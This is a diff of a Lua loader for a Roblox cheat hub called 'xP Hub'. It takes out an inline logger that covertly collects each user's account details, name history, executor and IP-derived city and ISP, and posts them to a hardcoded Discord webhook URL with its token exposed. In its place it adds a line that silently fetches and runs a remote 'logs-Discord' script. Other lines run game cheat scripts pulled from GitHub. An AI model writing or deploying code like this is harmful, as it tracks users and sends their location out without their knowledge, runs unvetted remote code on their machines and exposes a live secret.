@@ -1,341 +1,8 @@
---// xP Hub - Auto Detector by GameId + Webhook Logger v4
+--// xP Hub - Auto Detector by GameId (Webhook externo: logs-Discord)
 --// Cola no executor e executa
 
 -- ============================================================
--- SERVIÇOS
--- ============================================================
-local Players              = game:GetService("Players")
-local UserInputService     = game:GetService("UserInputService")
-local HttpService          = game:GetService("HttpService")
-local LocalizationService  = game:GetService("LocalizationService")
-local MarketplaceService   = game:GetService("MarketplaceService")
-
-local player = Players.LocalPlayer
-
--- ============================================================
--- WEBHOOK DE EXECUÇÃO (xP Hub Logger)
--- ============================================================
-local EXEC_WEBHOOK_URL = "https://discord.com/api/webhooks/1565645480359370782/BWqULA0_EwCjLJFJHwZ8xFZS6j3lb_8QbyLKXSGhOpTC1Uu8tzybPoSr7kaOyLB-Cpiq"
-
-local SKIP_FLAG_FILE   = "xPHub_skip_webhook.flag"
-local SKIP_FLAG_WINDOW = 180
-
--- ===== MAPA DE PAÍSES =====
-local COUNTRY_NAMES = {
-    ["AF"] = "Afghanistan", ["AL"] = "Albania", ["DZ"] = "Algeria",
-    ["AS"] = "American Samoa", ["AD"] = "Andorra", ["AO"] = "Angola",
-    ["AI"] = "Anguilla", ["AQ"] = "Antarctica", ["AG"] = "Antigua and Barbuda",
-    ["AR"] = "Argentina", ["AM"] = "Armenia", ["AW"] = "Aruba",
-    ["AU"] = "Australia", ["AT"] = "Austria", ["AZ"] = "Azerbaijan",
-    ["BS"] = "Bahamas", ["BH"] = "Bahrain", ["BD"] = "Bangladesh",
-    ["BB"] = "Barbados", ["BY"] = "Belarus", ["BE"] = "Belgium",
-    ["BZ"] = "Belize", ["BJ"] = "Benin", ["BM"] = "Bermuda",
-    ["BT"] = "Bhutan", ["BO"] = "Bolivia", ["BA"] = "Bosnia and Herzegovina",
-    ["BW"] = "Botswana", ["BV"] = "Bouvet Island", ["BR"] = "Brazil",
-    ["IO"] = "British Indian Ocean Territory", ["BN"] = "Brunei",
-    ["BG"] = "Bulgaria", ["BF"] = "Burkina Faso", ["BI"] = "Burundi",
-    ["KH"] = "Cambodia", ["CM"] = "Cameroon", ["CA"] = "Canada",
-    ["CV"] = "Cape Verde", ["KY"] = "Cayman Islands",
-    ["CF"] = "Central African Republic", ["TD"] = "Chad", ["CL"] = "Chile",
-    ["CN"] = "China", ["CX"] = "Christmas Island", ["CC"] = "Cocos Islands",
-    ["CO"] = "Colombia", ["KM"] = "Comoros", ["CG"] = "Congo",
-    ["CD"] = "Congo (DRC)", ["CK"] = "Cook Islands", ["CR"] = "Costa Rica",
-    ["CI"] = "Côte d'Ivoire", ["HR"] = "Croatia", ["CU"] = "Cuba",
-    ["CY"] = "Cyprus", ["CZ"] = "Czech Republic", ["DK"] = "Denmark",
-    ["DJ"] = "Djibouti", ["DM"] = "Dominica", ["DO"] = "Dominican Republic",
-    ["EC"] = "Ecuador", ["EG"] = "Egypt", ["SV"] = "El Salvador",
-    ["GQ"] = "Equatorial Guinea", ["ER"] = "Eritrea", ["EE"] = "Estonia",
-    ["ET"] = "Ethiopia", ["FK"] = "Falkland Islands", ["FO"] = "Faroe Islands",
-    ["FJ"] = "Fiji", ["FI"] = "Finland", ["FR"] = "France",
-    ["GF"] = "French Guiana", ["PF"] = "French Polynesia",
-    ["TF"] = "French Southern Territories", ["GA"] = "Gabon",
-    ["GM"] = "Gambia", ["GE"] = "Georgia", ["DE"] = "Germany",
-    ["GH"] = "Ghana", ["GI"] = "Gibraltar", ["GR"] = "Greece",
-    ["GL"] = "Greenland", ["GD"] = "Grenada", ["GP"] = "Guadeloupe",
-    ["GU"] = "Guam", ["GT"] = "Guatemala", ["GG"] = "Guernsey",
-    ["GN"] = "Guinea", ["GW"] = "Guinea-Bissau", ["GY"] = "Guyana",
-    ["HT"] = "Haiti", ["HM"] = "Heard Island", ["VA"] = "Vatican City",
-    ["HN"] = "Honduras", ["HK"] = "Hong Kong", ["HU"] = "Hungary",
-    ["IS"] = "Iceland", ["IN"] = "India", ["ID"] = "Indonesia",
-    ["IR"] = "Iran", ["IQ"] = "Iraq", ["IE"] = "Ireland",
-    ["IM"] = "Isle of Man", ["IL"] = "Israel", ["IT"] = "Italy",
-    ["JM"] = "Jamaica", ["JP"] = "Japan", ["JE"] = "Jersey",
-    ["JO"] = "Jordan", ["KZ"] = "Kazakhstan", ["KE"] = "Kenya",
-    ["KI"] = "Kiribati", ["KP"] = "North Korea", ["KR"] = "South Korea",
-    ["KW"] = "Kuwait", ["KG"] = "Kyrgyzstan", ["LA"] = "Laos",
-    ["LV"] = "Latvia", ["LB"] = "Lebanon", ["LS"] = "Lesotho",
-    ["LR"] = "Liberia", ["LY"] = "Libya", ["LI"] = "Liechtenstein",
-    ["LT"] = "Lithuania", ["LU"] = "Luxembourg", ["MO"] = "Macau",
-    ["MK"] = "North Macedonia", ["MG"] = "Madagascar", ["MW"] = "Malawi",
-    ["MY"] = "Malaysia", ["MV"] = "Maldives", ["ML"] = "Mali",
-    ["MT"] = "Malta", ["MH"] = "Marshall Islands", ["MQ"] = "Martinique",
-    ["MR"] = "Mauritania", ["MU"] = "Mauritius", ["YT"] = "Mayotte",
-    ["MX"] = "Mexico", ["FM"] = "Micronesia", ["MD"] = "Moldova",
-    ["MC"] = "Monaco", ["MN"] = "Mongolia", ["ME"] = "Montenegro",
-    ["MS"] = "Montserrat", ["MA"] = "Morocco", ["MZ"] = "Mozambique",
-    ["MM"] = "Myanmar", ["NA"] = "Namibia", ["NR"] = "Nauru",
-    ["NP"] = "Nepal", ["NL"] = "Netherlands", ["NC"] = "New Caledonia",
-    ["NZ"] = "New Zealand", ["NI"] = "Nicaragua", ["NE"] = "Niger",
-    ["NG"] = "Nigeria", ["NU"] = "Niue", ["NF"] = "Norfolk Island",
-    ["MP"] = "Northern Mariana Islands", ["NO"] = "Norway",
-    ["OM"] = "Oman", ["PK"] = "Pakistan", ["PW"] = "Palau",
-    ["PS"] = "Palestine", ["PA"] = "Panama", ["PG"] = "Papua New Guinea",
-    ["PY"] = "Paraguay", ["PE"] = "Peru", ["PH"] = "Philippines",
-    ["PN"] = "Pitcairn Islands", ["PL"] = "Poland", ["PT"] = "Portugal",
-    ["PR"] = "Puerto Rico", ["QA"] = "Qatar", ["RE"] = "Réunion",
-    ["RO"] = "Romania", ["RU"] = "Russia", ["RW"] = "Rwanda",
-    ["BL"] = "Saint Barthélemy", ["SH"] = "Saint Helena",
-    ["KN"] = "Saint Kitts and Nevis", ["LC"] = "Saint Lucia",
-    ["MF"] = "Saint Martin", ["PM"] = "Saint Pierre and Miquelon",
-    ["VC"] = "Saint Vincent and the Grenadines", ["WS"] = "Samoa",
-    ["SM"] = "San Marino", ["ST"] = "São Tomé and Príncipe",
-    ["SA"] = "Saudi Arabia", ["SN"] = "Senegal", ["RS"] = "Serbia",
-    ["SC"] = "Seychelles", ["SL"] = "Sierra Leone", ["SG"] = "Singapore",
-    ["SX"] = "Sint Maarten", ["SK"] = "Slovakia", ["SI"] = "Slovenia",
-    ["SB"] = "Solomon Islands", ["SO"] = "Somalia", ["ZA"] = "South Africa",
-    ["GS"] = "South Georgia", ["SS"] = "South Sudan", ["ES"] = "Spain",
-    ["LK"] = "Sri Lanka", ["SD"] = "Sudan", ["SR"] = "Suriname",
-    ["SJ"] = "Svalbard and Jan Mayen", ["SZ"] = "Eswatini",
-    ["SE"] = "Sweden", ["CH"] = "Switzerland", ["SY"] = "Syria",
-    ["TW"] = "Taiwan", ["TJ"] = "Tajikistan", ["TZ"] = "Tanzania",
-    ["TH"] = "Thailand", ["TL"] = "Timor-Leste", ["TG"] = "Togo",
-    ["TK"] = "Tokelau", ["TO"] = "Tonga", ["TT"] = "Trinidad and Tobago",
-    ["TN"] = "Tunisia", ["TR"] = "Turkey", ["TM"] = "Turkmenistan",
-    ["TC"] = "Turks and Caicos Islands", ["TV"] = "Tuvalu",
-    ["UG"] = "Uganda", ["UA"] = "Ukraine", ["AE"] = "United Arab Emirates",
-    ["GB"] = "United Kingdom", ["US"] = "United States",
-    ["UM"] = "U.S. Minor Outlying Islands", ["UY"] = "Uruguay",
-    ["UZ"] = "Uzbekistan", ["VU"] = "Vanuatu", ["VE"] = "Venezuela",
-    ["VN"] = "Vietnam", ["VG"] = "British Virgin Islands",
-    ["VI"] = "U.S. Virgin Islands", ["WF"] = "Wallis and Futuna",
-    ["EH"] = "Western Sahara", ["YE"] = "Yemen", ["ZM"] = "Zambia",
-    ["ZW"] = "Zimbabwe",
-}
-
-local function MarkSkipWebhook()
-    pcall(function() getgenv().xP_SkipWebhook = true end)
-    pcall(function() if writefile then writefile(SKIP_FLAG_FILE, tostring(os.time())) end end)
-end
-
-local function ShouldSkipWebhook()
-    local skipGenv = false
-    pcall(function()
-        if getgenv().xP_SkipWebhook then
-            getgenv().xP_SkipWebhook = nil
-            skipGenv = true
-        end
-    end)
-    if skipGenv then return true end
-    local skipFile = false
-    pcall(function()
-        if isfile and readfile and isfile(SKIP_FLAG_FILE) then
-            local content = readfile(SKIP_FLAG_FILE)
-            local t = tonumber(content)
-            if t and (os.time() - t) <= SKIP_FLAG_WINDOW then skipFile = true end
-            if delfile then pcall(function() delfile(SKIP_FLAG_FILE) end) end
-        end
-    end)
-    return skipFile
-end
-
-local function sanitizeForDiscord(s, maxLen)
-    s = tostring(s or "")
-    s = s:gsub("`", "'")
-    s = s:gsub("\r\n", " ")
-    s = s:gsub("[\r\n]", " ")
-    s = s:gsub("\t", " ")
-    if maxLen and #s > maxLen then s = s:sub(1, maxLen - 3) .. "..." end
-    return s
-end
-
--- ============================================================
--- WEBHOOK
--- ============================================================
-local function SendExecutionWebhook(selectedScriptUrl)
-    task.spawn(function()
-        pcall(function()
-            local reqFunc = request or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
-            if not reqFunc then return end
-
-            local userName    = sanitizeForDiscord(player.Name, 100)
-            local userId      = tostring(player.UserId)
-            local displayName = sanitizeForDiscord(player.DisplayName, 100)
-            local accountAge  = tostring(player.AccountAge)
-            local profileUrl  = "https://www.roblox.com/users/" .. userId .. "/profile"
-
-            local executor = "Desconhecido"
-            pcall(function() executor = tostring(identifyexecutor()) end)
-            executor = sanitizeForDiscord(executor, 100)
-
-            local platform = "Desconhecido"
-            pcall(function() platform = UserInputService:GetPlatform().Name end)
-            platform = sanitizeForDiscord(platform, 50)
-
-            local locale = "Desconhecido"
-            pcall(function() locale = player.LocaleId end)
-            locale = sanitizeForDiscord(locale, 20)
-
-            local country = "Desconhecido"
-            pcall(function()
-                local success, code = pcall(function()
-                    return LocalizationService:GetCountryRegionForPlayerAsync(player)
-                end)
-                if success and code and type(code) == "string" and code ~= "" then
-                    local upperCode = string.upper(code)
-                    if #upperCode == 2 and COUNTRY_NAMES[upperCode] then
-                        country = COUNTRY_NAMES[upperCode]
-                    else
-                        country = code
-                    end
-                end
-            end)
-            country = sanitizeForDiscord(country, 100)
-
-            local gameName = "Desconhecido"
-            pcall(function()
-                local info = MarketplaceService:GetProductInfo(game.PlaceId)
-                if info and info.Name then gameName = info.Name end
-            end)
-            gameName = sanitizeForDiscord(gameName, 200)
-
-            local placeIdStr = tostring(game.PlaceId)
-            local gameLink   = "https://www.roblox.com/games/" .. placeIdStr
-
-            local scriptFieldValue, scriptStatus
-            if selectedScriptUrl then
-                scriptStatus     = "✅ Script encontrado"
-                scriptFieldValue = selectedScriptUrl
-            else
-                scriptStatus     = "❌ Nenhum script disponível"
-                scriptFieldValue = "Nenhum script registrado para este Place ID"
-            end
-            scriptStatus     = sanitizeForDiscord(scriptStatus, 100)
-            scriptFieldValue = sanitizeForDiscord(scriptFieldValue, 900)
-
-            local avatarUrl   = "https://cdn.discordapp.com/embed/avatars/0.png"
-            local isVerified  = false
-            local ipInfo      = "Desconhecido"
-            local nameHistory = "Nenhum nome anterior"
-
-            pcall(function()
-                local avatarReq = reqFunc({
-                    Url    = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. userId .. "&size=420x420&format=Png",
-                    Method = "GET"
-                })
-                if avatarReq and avatarReq.Body then
-                    local avatarData = HttpService:JSONDecode(avatarReq.Body)
-                    if avatarData and avatarData.data and avatarData.data[1] then
-                        local url = avatarData.data[1].imageUrl
-                        if url and type(url) == "string" and url ~= "" then avatarUrl = url end
-                    end
-                end
-            end)
-
-            pcall(function()
-                local verifyReq = reqFunc({
-                    Url    = "https://users.roblox.com/v1/users/" .. userId,
-                    Method = "GET"
-                })
-                if verifyReq and verifyReq.Body then
-                    local verifyData = HttpService:JSONDecode(verifyReq.Body)
-                    if verifyData and verifyData.hasVerifiedBadge ~= nil then
-                        isVerified = verifyData.hasVerifiedBadge
-                    end
-                end
-            end)
-
-            pcall(function()
-                local histUrls = {
-                    "https://users.roblox.com/v1/users/" .. userId .. "/username-history?limit=10&sortOrder=Asc",
-                    "https://users.roblox.com/v1/users/" .. userId .. "/username-history?limit=10",
-                    "https://users.roblox.com/v1/users/" .. userId .. "/username-history"
-                }
-                for _, url in ipairs(histUrls) do
-                    local histReq = reqFunc({
-                        Url = url, Method = "GET",
-                        Headers = {
-                            ["Content-Type"] = "application/json",
-                            ["Accept"]       = "application/json"
-                        }
-                    })
-                    if histReq and histReq.Body and #histReq.Body > 0 then
-                        local okDecode, histData = pcall(function()
-                            return HttpService:JSONDecode(histReq.Body)
-                        end)
-                        if okDecode and histData and type(histData.data) == "table" and #histData.data > 0 then
-                            local names = {}
-                            for _, entry in ipairs(histData.data) do
-                                if entry and entry.name and type(entry.name) == "string" and entry.name ~= "" then
-                                    table.insert(names, sanitizeForDiscord(entry.name, 50))
-                                end
-                            end
-                            if #names > 0 then nameHistory = table.concat(names, " → ") return end
-                        end
-                    end
-                end
-            end)
-            nameHistory = sanitizeForDiscord(nameHistory, 900)
-
-            pcall(function()
-                local ipReq = reqFunc({ Url = "https://ipapi.co/json/", Method = "GET" })
-                if ipReq and ipReq.Body then
-                    local ipData = HttpService:JSONDecode(ipReq.Body)
-                    if ipData and ipData.city and ipData.country_name then
-                        ipInfo = string.format("%s, %s (%s)",
-                            sanitizeForDiscord(ipData.city, 50),
-                            sanitizeForDiscord(ipData.country_name, 50),
-                            sanitizeForDiscord(ipData.org or "N/A", 100))
-                    end
-                end
-            end)
-            ipInfo = sanitizeForDiscord(ipInfo, 200)
-
-            local timestamp = os.date("%Y-%m-%d %H:%M:%S")
-
-            local payload = {
-                username   = "xP Hub Logger",
-                avatar_url = avatarUrl,
-                embeds = {
-                    {
-                        title     = "🚀 xP Hub Executed",
-                        color     = 3447003,
-                        thumbnail = { url = avatarUrl },
-                        fields = {
-                            { name = "🎮 Game Name",       value = "```" .. gameName      .. "```\n[🔗 Abrir no Roblox](" .. gameLink .. ")", inline = false },
-                            { name = "🗺️ Place ID",        value = "```" .. placeIdStr    .. "```", inline = true  },
-                            { name = "📥 Script Detectado", value = "```" .. scriptStatus  .. "```", inline = true  },
-                            { name = "🔗 Script URL",       value = "```" .. scriptFieldValue .. "```", inline = false },
-                            { name = "👤 Account Name",     value = "```" .. userName      .. "```", inline = true  },
-                            { name = "🏷️ Display Name",     value = "```" .. displayName   .. "```", inline = true  },
-                            { name = "🆔 Account ID",       value = "```" .. userId        .. "```", inline = true  },
-                            { name = "📅 Account Age",      value = "```" .. accountAge    .. " days```", inline = true },
-                            { name = "✅ Verified",         value = "```" .. tostring(isVerified) .. "```", inline = true },
-                            { name = "🌍 Country",          value = "```" .. country       .. "```", inline = true  },
-                            { name = "🗣️ Locale",           value = "```" .. locale        .. "```", inline = true  },
-                            { name = "💻 Platform",         value = "```" .. platform      .. "```", inline = true  },
-                            { name = "⚙️ Executor",         value = "```" .. executor      .. "```", inline = true  },
-                            { name = "🌐 IP Location",      value = "```" .. ipInfo        .. "```", inline = false },
-                            { name = "📜 Name History",     value = "```" .. nameHistory   .. "```", inline = false },
-                            { name = "🔗 Profile",          value = "[Clique aqui](" .. profileUrl .. ")", inline = false },
-                            { name = "⏰ Executed Script",  value = "```" .. timestamp     .. "```", inline = false },
-                        },
-                        footer = { text = "xP Hub • " .. timestamp },
-                    },
-                },
-            }
-
-            reqFunc({
-                Url     = EXEC_WEBHOOK_URL,
-                Method  = "POST",
-                Headers = { ["Content-Type"] = "application/json" },
-                Body    = HttpService:JSONEncode(payload),
-            })
-        end)
-    end)
-end
-
--- ============================================================
--- DETECTOR DE GAME ID (com lookup robusto)
+-- DETECTOR DE GAME ID
 -- ============================================================
 local GameScripts = {
     [13772394625]     = "https://raw.githubusercontent.com/xP-Devv/xP-Hub/refs/heads/main/xP-Blade-Ball",
@@ -354,25 +21,20 @@ local GameScripts = {
     [84448037861644]  = "https://raw.githubusercontent.com/xP-Devv/xP-Hub/refs/heads/main/xP-Urban-Reload",
 }
 
--- Função robusta: tenta numérico, string, e scan completo
+-- Link do seu webhook standalone que já está no GitHub
+local WEBHOOK_SCRIPT_URL = "https://raw.githubusercontent.com/xP-Devv/xP-Hub/refs/heads/main/logs-Discord"
+
+-- Lookup robusto (numérico + string + scan)
 local function GetScriptForPlaceId(placeId)
     if not placeId then return nil end
-
-    -- 1) Lookup numérico direto
     local found = GameScripts[placeId]
     if found then return found end
-
-    -- 2) Lookup por string
     local placeIdStr = tostring(placeId)
     found = GameScripts[placeIdStr]
     if found then return found end
-
-    -- 3) Scan com comparação de string (cobre pequenas diferenças de precisão)
     for id, url in pairs(GameScripts) do
         if tostring(id) == placeIdStr then return url end
     end
-
-    -- 4) Scan com comparação numérica (via tonumber)
     local placeIdNum = tonumber(placeIdStr)
     if placeIdNum then
         for id, url in pairs(GameScripts) do
@@ -380,24 +42,37 @@ local function GetScriptForPlaceId(placeId)
             if idNum and idNum == placeIdNum then return url end
         end
     end
-
     return nil
 end
 
-local CurrentPlaceId = game.PlaceId
-local CurrentGameId  = game.GameId
+local CurrentPlaceId    = game.PlaceId
+local CurrentGameId     = game.GameId
+local SelectedScriptUrl = GetScriptForPlaceId(CurrentPlaceId) or GetScriptForPlaceId(CurrentGameId)
 
 print("[xP Hub] Detectando jogo... PlaceId: " .. tostring(CurrentPlaceId) .. " | GameId: " .. tostring(CurrentGameId))
 
--- Tenta achar script pelo PlaceId; se não achar, tenta pelo GameId
-local SelectedScriptUrl = GetScriptForPlaceId(CurrentPlaceId) or GetScriptForPlaceId(CurrentGameId)
+-- ============================================================
+-- 1) SETA A URL DO SCRIPT DETECTADO PARA O WEBHOOK LER
+-- ============================================================
+pcall(function()
+    getgenv().xP_DetectedScriptUrl = SelectedScriptUrl
+end)
 
--- 1) Manda webhook (com game info + script detectado)
-if not ShouldSkipWebhook() then
-    SendExecutionWebhook(SelectedScriptUrl)
-end
+-- ============================================================
+-- 2) CHAMA O WEBHOOK EXTERNO (logs-Discord)
+-- ============================================================
+task.spawn(function()
+    local ok, err = pcall(function()
+        loadstring(game:HttpGet(WEBHOOK_SCRIPT_URL))()
+    end)
+    if not ok then
+        warn("[xP Hub] Falha ao carregar webhook externo: " .. tostring(err))
+    end
+end)
 
--- 2) Executa o script (se existir)
+-- ============================================================
+-- 3) EXECUTA O SCRIPT DO JOGO (se existir)
+-- ============================================================
 if SelectedScriptUrl then
     print("[xP Hub] Jogo encontrado! Carregando script: " .. SelectedScriptUrl)
     local success, err = pcall(function()
